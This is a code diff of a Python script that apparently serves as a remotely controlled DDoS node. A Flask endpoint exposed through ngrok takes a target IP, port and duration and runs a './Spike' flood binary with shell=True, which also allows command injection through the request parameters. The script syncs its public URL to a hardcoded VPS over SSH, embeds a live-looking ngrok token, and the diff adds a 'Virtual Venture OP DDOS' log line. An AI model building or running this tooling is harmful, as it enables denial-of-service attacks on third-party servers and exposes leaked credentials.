@@ -7,33 +7,36 @@ from pyngrok import ngrok
 import paramiko
 import time
 
-# Set up logging
-logging.basicConfig(
-    filename='app.log',
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',
-)
-
 active_processes = {}
+
+# Set up logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
+
+def log_message_periodically():
+    def periodic_logging():
+        while True:
+            logging.info("Virtual Venture OP DDOS")
+            time.sleep(60)  # 5 minutes in seconds
+    thread = threading.Thread(target=periodic_logging, daemon=True)
+    thread.start()
 
 def install_packages():
     required_packages = ['Flask', 'pyngrok', 'paramiko']
     for package in required_packages:
         try:
             subprocess.check_call([f'{os.sys.executable}', '-m', 'pip', 'show', package])
-            logging.info(f"Package '{package}' is already installed.")
         except subprocess.CalledProcessError:
             try:
                 subprocess.check_call([f'{os.sys.executable}', '-m', 'pip', 'install', package])
-                logging.info(f"Package '{package}' installed successfully.")
+                logging.info(f"{package} installed successfully.")
             except subprocess.CalledProcessError:
-                logging.error(f"Failed to install package '{package}'.")
+                logging.error(f"Failed to install {package}.")
 
 def configure_ngrok():
     ngrok_token = "2pGe18Mcmpu5E7UukoFjWqBFepT_2m2nNPzuwpanQsdXGkiKd"
     try:
         ngrok.set_auth_token(ngrok_token)
-        logging.info("Ngrok token configured successfully.")
+        logging.info("ngrok token configured successfully.")
     except Exception as e:
         logging.error(f"Failed to configure ngrok: {str(e)}")
 
@@ -41,9 +44,9 @@ def update_soul_txt(public_url):
     try:
         with open("binder2.txt", "w") as file:
             file.write(public_url)
-        logging.info("Updated binder2.txt with new ngrok link.")
+        logging.info(f"New ngrok link saved in binder2.txt")
     except Exception as e:
-        logging.error(f"Failed to update binder2.txt: {str(e)}")
+        logging.error(f"Failed to save ngrok link: {str(e)}")
 
 def update_vps_soul_txt(public_url):
     vps_ip = "157.173.113.94"
@@ -61,14 +64,14 @@ def update_vps_soul_txt(public_url):
         ssh.close()
         logging.info("Updated binder2.txt on VPS successfully.")
     except Exception as e:
-        logging.error(f"Failed to update binder1.txt on VPS: {str(e)}")
+        logging.error(f"Failed to update binder2.txt on VPS: {str(e)}")
 
 def execute_command_async(command, duration):
     def run(command_id):
         try:
             process = subprocess.Popen(command, shell=True)
             active_processes[command_id] = process.pid
-            logging.info(f"Command '{command}' started with PID: {process.pid}")
+            logging.info(f"Command executed: {command} with PID: {process.pid}")
 
             time.sleep(duration)
 
@@ -78,7 +81,7 @@ def execute_command_async(command, duration):
                 del active_processes[command_id]
                 logging.info(f"Process {process.pid} terminated after {duration} seconds.")
         except Exception as e:
-            logging.error(f"Error executing command '{command}': {str(e)}")
+            logging.error(f"Error executing command: {str(e)}")
 
     command_id = f"cmd_{len(active_processes) + 1}"
     thread = threading.Thread(target=run, args=(command_id,))
@@ -95,12 +98,12 @@ def run_flask_app():
     try:
         public_url_obj = ngrok.connect(5002)
         public_url = public_url_obj.public_url
-        logging.info(f"Ngrok public URL: {public_url}")
+        logging.info(f"Public URL: {public_url}")
 
         update_soul_txt(public_url)
         update_vps_soul_txt(public_url)
     except KeyboardInterrupt:
-        logging.warning("Ngrok process interrupted by user.")
+        logging.info("ngrok process was interrupted.")
     except Exception as e:
         logging.error(f"Failed to start ngrok: {str(e)}")
 
@@ -111,11 +114,9 @@ def run_flask_app():
         duration = request.args.get('time')
 
         if not ip or not port or not duration:
-            logging.warning("Missing parameters for /bgmi request.")
             return jsonify({'error': 'Missing parameters'}), 400
 
         command = f"./Spike {ip} {port} {duration} 1024 400"
-        logging.info(f"Received command: {command}")
         response = execute_command_async(command, int(duration))
         return jsonify(response)
 
@@ -123,10 +124,7 @@ def run_flask_app():
     app.run(host='0.0.0.0', port=5002)
 
 if __name__ == "__main__":
-    logging.info("Script started.")
     install_packages()
     configure_ngrok()
-    try:
-        run_flask_app()
-    except Exception as e:
-        logging.error(f"Unexpected error: {str(e)}")
+    log_message_periodically()
+    run_flask_app()
